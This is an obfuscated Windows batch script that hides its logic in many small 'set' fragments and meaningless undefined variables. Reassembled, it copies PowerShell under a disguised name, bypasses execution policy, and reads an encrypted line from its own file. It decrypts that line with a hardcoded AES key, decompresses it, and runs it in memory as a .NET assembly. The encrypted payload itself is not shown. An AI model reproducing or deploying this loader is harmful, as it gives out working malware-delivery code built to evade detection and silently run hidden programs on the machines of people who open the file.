@echo off
set "LTPZXggzFd=-ep "
set "LwtSTDcbuB=grap"
set "IhBfVKfoaR=);$L"
set "lyCeYZCLSC=F'[-"
set "ZvWIRnzVEI=dj0C"
set "blwxcSzbLr=)) {"
set "esmKlnYxcS=y.Cr"
set "hkJvccnhYA=vert"
set "cYikfnPjbo=hfGj"
set "dKZUAbbqRA=-joi"
set "LKLVkBoaro=oint"
set "UwaIKgoPAn=fsqC"
set "pomfojkrXX=g.En"
set "nZXyfWOUtG=ptog"
set "JAimAJYzIR=hfGj"
set "XaVUINrpEN=('da"
set "NJDQZphbfv=PxEW"
set "abofCWmjpz=eMVs"
set "LVNhXOVRLr=tem."
set "nBxyQCOBSv=] -j"
set "WNRFbeNiFR=iron"
set "PTATmSitJr=SdGH"
set "oXeobsSvvd=iCo."
set "RvoPvheKbl=trea"
set "aYmrfwWtpP=1..-"
set "LizZKHdHxj=$SdG"
set "XWdkkskkUh=n ''"
set "JdEdhKEjHv=Mode"
set "XeOsZAbEQs=SdGH"
set "kHVLChwLmZ=o = "
set "xMxuUqdJCs=:: '"
set "QHAIMJEQAf=and "
set "nfbLbPJKse=nirt"
set "PGhWmgQPme=$LjK"
set "HypCITRjLU=n, 0"
set "RkcLBlbCCf=106u"
set "zqooiqLDyh='')("
set "yqUnWAXQmH=PTtG"
set "JMcQLmUNjH=.Cry"
set "RKyfIlKtEw='[-1"
set "KDFHOTdxsP=();$"
set "eQWObYekcb=rt]:"
set "ZIyIqNzSpJ=();$"
set "OfoMeuaEkq=YxVw"
set "XcZuJZNeOy=ptog"
set "AwmCfeMtXt=('Tg"
set "FVPuYDwxPi=giVM"
set "WNuLcpgNzW=ew-O"
set "OvcRVTvGIk=ect "
set "LdySdrqwER=, (,"
set "DWYmrUFPLC=AahG"
set "ZXWYxjhJfD== [S"
set "DRPQYZEutR=n = "
set "xzQFhSsNrR=.Com"
set "JHaARydLHk=hGU "
set "gbkNxdNAKB=g = "
set "HkuWhOAfHk=Cwf "
set "eNnpwAdBkG=join"
set "HjDbkeOEYE=se()"
set "lxNKwYhyRn=($Aa"
set "PVctDftHWx=16] "
set "woiVKPlqUY=Secu"
set "VsQsVEHkuG=;$Es"
set "mrnxPazmQh=Cwf."
set "nizSccELLr=k; }"
set "LfDnUYkkSS=am;$"
set "kapStScPgT=U.Su"
set "YTpKTidaAQ=ChfG"
set "PcXXGyWzdD= if "
set "hOkeWOkPUe= = $"
set "zjcUnqORhM=oryS"
set "MPyYbRKhGf=[]] "
set "pkkcSuTiAE= [st"
set "KjFCngObMD=stem"
set "zPkYwajZnm= = ["
set "sIkJdQljGi=ateD"
set "gVJsaaRswj=);$f"
set "pzqxAwhtCD=rity"
set "pbpZXPUmgN=)($S"
set "yvNBoNbsgd=oL'["
set "bJdfciDJWK=ress"
set "TKihoZJkAt=e = "
set "QYsAELlkCh=l5E7"
set "sgXjEIJLvp=New-"
set "OLRDYHhIXm=$fsq"
set "KQUrKyfRQm=$Cyi"
set "kqLcOWjOuI=.Sec"
set "cDhWaBXuCp=tryP"
set "kDpxysLNWg=yste"
set "KVMBtXdGAV=.Con"
set "KFyGMuqwbO=Secu"
set "RwtXhKXWZe=File"
set "qhyzdVzGZb=);$y"
set "YEVKrPSXGR= = $"
set "oCGiXxfkxy=V = "
set "ANYehoDdNf=6] -"
set "VMeotOajbJ=hGU."
set "UxgmLvkBPv=ddin"
set "CFiynaeLmr=ress"
set "IcbOSCKKZK=]::("
set "AMHCFiiXGP=ay()"
set "ExBOBWsGmJ=-joi"
set "otqlSYOkNm=orF'"
set "PJBBvAjnJM=-4] "
set "XWLjbhdAPG=morF"
set "eqhFRSSRjk=);$C"
set "OeNZitrfln=ewLi"
set "UjZJxyznzh=ke($"
set "QXgCaiCQWb=dGbI"
set "BeirzvZDHZ=embl"
set "wLzmFHwYKG=pStr"
set "xOSgoCmqYI=y]::"
set "VeMKuJvbNh=S46e"
set "rxygDAVspV=SdGH"
set "cJtJTyuWEF=Hn);"
set "VdrEyqvLkY=Obje"
set "mfaXJGtrsx=-Obj"
set "exnRjjTGBQ= New"
set "vTIQgyPelD=raph"
set "evTwiUuHhk=ispo"
set "VYTJHTkbDw=E = "
set "eLCWYaHGon=..-1"
set "komPmiodVn=tS46"
set "eFXbZddpHe=).Sp"
set "zhENSKhajb=zuZI"
set "wOMNXRkyWv=ss -"
set "mnbeAXDTsE=ose("
set "VyEHbiVGYp=le  "
set "YhSZdElmfb=;$Cy"
set "KKkEUaRmuY= '')"
set "JWbeOHwOAI=Comp"
set "wQewPIcJLE=stem"
set "yWycwKBCzr=Gj.I"
set "RNAoHSisKC=in $"
set "EnZNTMiwhV=.Cry"
set "qcWxYbFNLv=ionM"
set "fqwnhcazjt=.Ass"
set "xLYSWFQhBh=Comp"
set "HGFzsqynzy=RmAx"
set "mHTytVHwqT=bstr"
set "agflaaSaJy=CE.D"
set "OMchKnBFIb=;$Es"
set "yurYxpgpQf='[-1"
set "wPfuBLwVfK=pres"
set "gvRVOgmfwG=lBlo"
set "XMLCbOUjgY=esMa"
set "pZgubSpYCH=[Env"
set "IALeMWSMyP=Star"
set "VOmKMsBVnU=wC.T"
set "vWukwierIG=.IO."
set "CsyJJYjjZB=7;$C"
set "ElLATMqKEw=[Sys"
set "wQIuCKmsjx=y.Pa"
set "VkmROiGGeA=]::("
set "yvDswcuaWL=KRIw"
set "ZPJenSCqGt=zZqF"
set "fHFuLgMLMg=.Key"
set "OfAWclrszl=n = "
set "DoWAjMuVrD=Conv"
set "UhhEhLqQeh=urit"
set "ISUvpVYEjR=.Mod"
set "oFHzpSSjDx=wf.T"
set "QdMqnYkHHF=s) {"
set "UjNPSqdkZl=hfGj"
set "wRUsZZTPkJ=;$dG"
set "GEgQgxrJYk=$SdG"
set "DplEbOBKUx=::De"
set "UloBSvKcQV=oin "
set "FntrPpwiAT=)($X"
set "OroqxNnFpF=CyiC"
set "apuIJdYJDR=th('"
set "dqQNvNuRCz=ne);"
set "MnmprPtRFq=('%~f0'"
set "zXiRFsOyki=::('"
set "WMAxMmtOkb= '')"
set "MXWxPeHcBN=m.Re"
set "LXIMMKefbb=.-16"
set "lXcBbIjIyF=d;$C"
set "hcIIRPICXq=('%*'"
set "BNeJLPVIXR=L4Yi"
set "vUKkJAIVNl=6esa"
set "vDGKmJDtkS=ert]"
set "eODLPzVWVQ=flec"
set "bhmiPaVZOd=.Dis"
set "ethuoQnNZm=Obje"
set "LtdPqlcrkT=ptor"
set "AiwDgbkWpw=ing("
set "RfBLAQABwL=m.IO"
set "NvfkhBZIMq=ion."
set "SEHiBLhBSa=sion"
set "cIITqSNPJP=rans"
set "ErjeuMGHtb=..-1"
set "XAQieOnean= [Sy"
set "EanBzsdZpf=ecry"
set "CJaAshlBsO=1] -"
set "zlxEHVkOBO=t Sy"
set "TvVjJGReVK=.Cre"
set "mTpfQmAWOB=pher"
set "YJmohitesK=)))"
set "dcuLqCYwqs=comm"
set "pjdBgHLPSF=ddin"
set "MfPhHmSHEG=$LjK"
set "wdQficHzVo=dGHn"
set "suHxngfvCT=Co, "
set "JwKVLpBRdk=PKCS"
set "kXQdvYYZNc=[Sys"
set "iBpdhbgGMV='txe"
set "lIeIBwFLNZ=y.Ci"
set "ntXRkpXqSt=stem"
set "OsvELiNZuf=gth)"
set "UJjLYNWuiC='0Pg"
set "LndiLSehNd=();$"
set "HEKhgSudjc=gsYZ"
set "iBewZAlMhm=pose"
set "UPteREkEtI=[Sys"
set "ltjUrxFgum=jKwC"
set "gDYhjrxqZE=-1.."
set "McQMEWdASv=brea"
set "lSNkqGXrhZ=yTo("
set "pqbcsYBEEW=fore"
set "pOgYEYJtbb=-nop"
set "NmYqngnjwt=mory"
set "SjKGzggGgH=tion"
set "pJeAbVUNvl=form"
set "PZcQvgZvQU=pose"
set "ZSEPKSSNSW=null"
set "TJMaMQQQtz=.Mem"
set "RmbczSNSUK===')"
set "WBEpRCCYXz=ment"
set "mGwBcsNMgj=ct S"
set "NwtUeCpoxM=Stre"
set "KqygcgYNNf=wC);"
set "WfvHrOmAsV=CFxo"
set "BohvGbchcR=hfGj"
set "zrQOfUMdXC=em.C"
set "NjGwzOyRdb=yste"
set "AChIIsfcuJ=  $X"
set "heZIjweYOL=);$C"
set "oANkRNmUFb=ct S"
set "YjiGrjFSim=giVM"
set "wOwnzXhgLW=rofi"
set "FhulxGDeJG=ode]"
set "sHIWlwqCWu=e]::"
set "LtThcfQwRx==');"
set "oIfQtMRXiu=ose("
set "kinHqFDrUN=Invo"
set "ngDurKoAPy=Syst"
set "pYmnbeyCZg=]::N"
set "ADeUwSBfPN=;$yK"
set "xmsvRnWidE=New-"
set "FluqJeHmta=Disp"
set "JWvuvQaaKz=TllA"
set "ucrPlCEDZT=BC;$"
set "TThwEPQODl=tem."
set "kGfVgGNhgz=oArr"
set "HgAJqxznwv=; };"
set "WuQusEmxdd=.Dis"
set "ENJuZwDeHh=dGHn"
set "AVTnSYxmkQ=sqCE"
set "HXATABIBrg== $C"
set "qOFqmBZSzj=yste"
set "QYWFzRdaQA=hy.A"
set "FkiydSOEhy=ach "
set "vLjAySRHdw=eam("
set "WdmdCboxct=tsWi"
set "qYUuqJZsYE=ress"
set "HZXWEUlfBS=.Cop"
set "padoaAOejh=$Chf"
set "CHJiaHZDgN=comp"
set "xEZqYvhZBH=bjec"
set "oinMbJVofN=wC ="
set "OUYMybuFNF=$EsC"
set "UOSMFHBLks=zHhH"
set "CVHAZlhIuN=rtS4"
set "sDqYRFChwh= [Sy"
set "fzEpOZKRRf=hfGj"
set "nABMERCdaW=Disp"
set "CgRRApSXXx=Syst"
set "tmfOtiipdv=em.I"
set "WdlEKoXrTn=]::C"
set "ouSYfOzlTX=[-1."
set "lUasvIYtRI=nage"
set "gXJoEotboH=.GZi"
set "eIpeYPotow=.Len"
set "nEWXqFBhyu=ck($"
%sTKvNEELPj%%cREriIskfh%%jQDcgYrTqH%%SHAfWSzpIX%%BGAsCmbJAx%%fzMAnBpIpP%%nKvirvqzvq%%jdBhGDqlzT%%WHtSBsUaSu%%CRZTKRkrah%%VCojocXFTK%%leivTFqCHY%%AqHaOrdIwP%%sYksXttkEy%%upgijxJEaf%%AIKbGFVnuW%%ZpiermTQyz%%lfYiEljyRq%%IzIroJojLs%%ygPHyfgbQW%%ESfATuJBxv%%vwveoAHRPH%%YKfgbfqqKz%%ehIVMPthxU%%aMLpWbKLtY%%ypmiXTNZyN%%etRYqnOArz%%hztVHmYPja%%vEXLbPVAYS%%btJKQGVNYI%%nkuTRYVrAL%%VYQyszvfXB%%snByxNPJea%"%~dp0%~nx0.exe"
cls
%rzSnVnykcT%%FVPCLtubSD%
"%~nx0.exe" %pOgYEYJtbb%%wOwnzXhgLW%%VyEHbiVGYp%%LTPZXggzFd%%jmUNgWXgBU%%wOMNXRkyWv%%dcuLqCYwqs%%QHAIMJEQAf%%lOfeTWhccf%%WICjZgSixD%%XAQieOnean%%ntXRkpXqSt%%vWukwierIG%%RwtXhKXWZe%%IcbOSCKKZK%%iBpdhbgGMV%%JWvuvQaaKz%%rbqOKtVFrT%%yurYxpgpQf%%ErjeuMGHtb%%CJaAshlBsO%%gBoTwpFxWg%%KKkEUaRmuY%%MnmprPtRFq%%eFXbZddpHe%%hjLnrRzvFs%%pZgubSpYCH%%WNRFbeNiFR%%WBEpRCCYXz%%pYmnbeyCZg%%OeNZitrfln%%dqQNvNuRCz%%pqbcsYBEEW%%FkiydSOEhy%%lxNKwYhyRn%%JHaARydLHk%%RNAoHSisKC%%ZPJenSCqGt%%QdMqnYkHHF%%PcXXGyWzdD%%QOOpoTXVnY%%VMeotOajbJ%%IALeMWSMyP%%WdmdCboxct%%apuIJdYJDR%%xMxuUqdJCs%%blwxcSzbLr%%AChIIsfcuJ%%YjiGrjFSim%%YEVKrPSXGR%%DWYmrUFPLC%%kapStScPgT%%mHTytVHwqT%%AiwDgbkWpw%%DPhGcXpcqz%%McQMEWdASv%%nizSccELLr%%HgAJqxznwv%%GEgQgxrJYk%%YKdTjuppDa%%sDqYRFChwh%%wQewPIcJLE%%KVMBtXdGAV%%hkJvccnhYA%%VkmROiGGeA%%rGDZpxQPFU%%CVHAZlhIuN%%vUKkJAIVNl%%rxBZEBHJgF%%lyCeYZCLSC%%aYmrfwWtpP%%PVctDftHWx%%ExBOBWsGmJ%%XWdkkskkUh%%FntrPpwiAT%%FVPuYDwxPi%%eqhFRSSRjk%%UjNPSqdkZl%%AjftechImH%%WNuLcpgNzW%%xEZqYvhZBH%%zlxEHVkOBO%%KjFCngObMD%%kqLcOWjOuI%%UhhEhLqQeh%%esmKlnYxcS%%GgnXxjzvQL%%LwtSTDcbuB%%QYWFzRdaQA%%XMLCbOUjgY%%lUasvIYtRI%%lXcBbIjIyF%%fzEpOZKRRf%%ISUvpVYEjR%%TKihoZJkAt%%ElLATMqKEw%%XgCMascHlg%%KFyGMuqwbO%%pzqxAwhtCD%%EnZNTMiwhV%%XcZuJZNeOy%%vTIQgyPelD%%lIeIBwFLNZ%%mTpfQmAWOB%%JdEdhKEjHv%%WdlEKoXrTn%%ucrPlCEDZT%%YTpKTidaAQ%%RvdrcjIKvC%%pjdBgHLPSF%%gbkNxdNAKB%%kXQdvYYZNc%%TThwEPQODl%%woiVKPlqUY%%vhaUrrsZfi%%JMcQLmUNjH%%nZXyfWOUtG%%MIeOGMTnfm%%wQIuCKmsjx%%UxgmLvkBPv%%DxGyvbHnjZ%%sHIWlwqCWu%%JwKVLpBRdk%%CsyJJYjjZB%%cYikfnPjbo%%fHFuLgMLMg%%zPkYwajZnm%%ngDurKoAPy%%zrQOfUMdXC%%lxxScnOjNf%%eQWObYekcb%%SmVoGhZvTC%%nfbLbPJKse%%VeMKuJvbNh%%PCbWJZCimU%%otqlSYOkNm%%ouSYfOzlTX%%LXIMMKefbb%%nBxyQCOBSv%%UloBSvKcQV%%zqooiqLDyh%%UJjLYNWuiC%%ZYtycAJgTr%%abofCWmjpz%%RkcLBlbCCf%%yqUnWAXQmH%%HEKhgSudjc%%BNeJLPVIXR%%zhENSKhajb%%ZvWIRnzVEI%%QYsAELlkCh%%EoTuiAZXpw%%LtThcfQwRx%%padoaAOejh%%yWycwKBCzr%%oCGiXxfkxy%%UPteREkEtI%%LVNhXOVRLr%%DoWAjMuVrD%%vDGKmJDtkS%%zXiRFsOyki%%BnzgUGSTVf%%komPmiodVn%%kBGSRGffUQ%%XWLjbhdAPG%%RKyfIlKtEw%%eLCWYaHGon%%ANYehoDdNf%%eNnpwAdBkG%%WMAxMmtOkb%%AwmCfeMtXt%%HGFzsqynzy%%WfvHrOmAsV%%UOSMFHBLks%%NJDQZphbfv%%OfoMeuaEkq%%RmbczSNSUK%%OMchKnBFIb%%HkuWhOAfHk%%HXATABIBrg%%BohvGbchcR%%TvVjJGReVK%%sIkJdQljGi%%EanBzsdZpf%%LtdPqlcrkT%%KDFHOTdxsP%%PTATmSitJr%%DRPQYZEutR%%OUYMybuFNF%%oFHzpSSjDx%%cIITqSNPJP%%pJeAbVUNvl%%yCGdcXkpAg%%gvRVOgmfwG%%nEWXqFBhyu%%XeOsZAbEQs%%HypCITRjLU%%IOrPXTFJNx%%wdQficHzVo%%eIpeYPotow%%OsvELiNZuf%%VsQsVEHkuG%%mrnxPazmQh%%FluqJeHmta%%oIfQtMRXiu%%heZIjweYOL%%JAimAJYzIR%%WuQusEmxdd%%iBewZAlMhm%%ZIyIqNzSpJ%%OroqxNnFpF%%kHVLChwLmZ%%xmsvRnWidE%%ethuoQnNZm%%mGwBcsNMgj%%qOFqmBZSzj%%RfBLAQABwL%%TJMaMQQQtz%%zjcUnqORhM%%RvoPvheKbl%%SmqupHcFDv%%LizZKHdHxj%%cJtJTyuWEF%%MfPhHmSHEG%%oinMbJVofN%%exnRjjTGBQ%%mfaXJGtrsx%%OvcRVTvGIk%%CgRRApSXXx%%tmfOtiipdv%%pEVHYIuvWp%%NmYqngnjwt%%NwtUeCpoxM%%LfDnUYkkSS%%UwaIKgoPAn%%VYTJHTkbDw%%sgXjEIJLvp%%VdrEyqvLkY%%oANkRNmUFb%%NjGwzOyRdb%%xCtlrRGokq%%xzQFhSsNrR%%wPfuBLwVfK%%SEHiBLhBSa%%gXJoEotboH%%wLzmFHwYKG%%vLjAySRHdw%%KQUrKyfRQm%%suHxngfvCT%%piQmFuOjPL%%xLYSWFQhBh%%CFiynaeLmr%%NvfkhBZIMq%%JWbeOHwOAI%%qYUuqJZsYE%%qcWxYbFNLv%%FhulxGDeJG%%DplEbOBKUx%%CHJiaHZDgN%%bJdfciDJWK%%gVJsaaRswj%%AVTnSYxmkQ%%HZXWEUlfBS%%lSNkqGXrhZ%%PGhWmgQPme%%KqygcgYNNf%%OLRDYHhIXm%%agflaaSaJy%%evTwiUuHhk%%HjDbkeOEYE%%YhSZdElmfb%%oXeobsSvvd%%nABMERCdaW%%mnbeAXDTsE%%IhBfVKfoaR%%ltjUrxFgum%%bhmiPaVZOd%%PZcQvgZvQU%%LndiLSehNd%%rxygDAVspV%%OfAWclrszl%%yjpAANedxX%%VOmKMsBVnU%%kGfVgGNhgz%%AMHCFiiXGP%%wRUsZZTPkJ%%KweEaRdtuU%%ZXWYxjhJfD%%kDpxysLNWg%%MXWxPeHcBN%%eODLPzVWVQ%%SjKGzggGgH%%fqwnhcazjt%%BeirzvZDHZ%%xOSgoCmqYI%%XaVUINrpEN%%yvNBoNbsgd%%gDYhjrxqZE%%PJBBvAjnJM%%dKZUAbbqRA%%BTjUBubOKq%%pbpZXPUmgN%%ENJuZwDeHh%%qhyzdVzGZb%%yvDswcuaWL%%hOkeWOkPUe%%QXgCaiCQWb%%pomfojkrXX%%cDhWaBXuCp%%LKLVkBoaro%%ADeUwSBfPN%%ETSXcnPkCz%%kinHqFDrUN%%UjZJxyznzh%%ZSEPKSSNSW%%LdySdrqwER%%pkkcSuTiAE%%OCKuzsDyWy%%MPyYbRKhGf%%hcIIRPICXq%%YJmohitesK%
exit /b
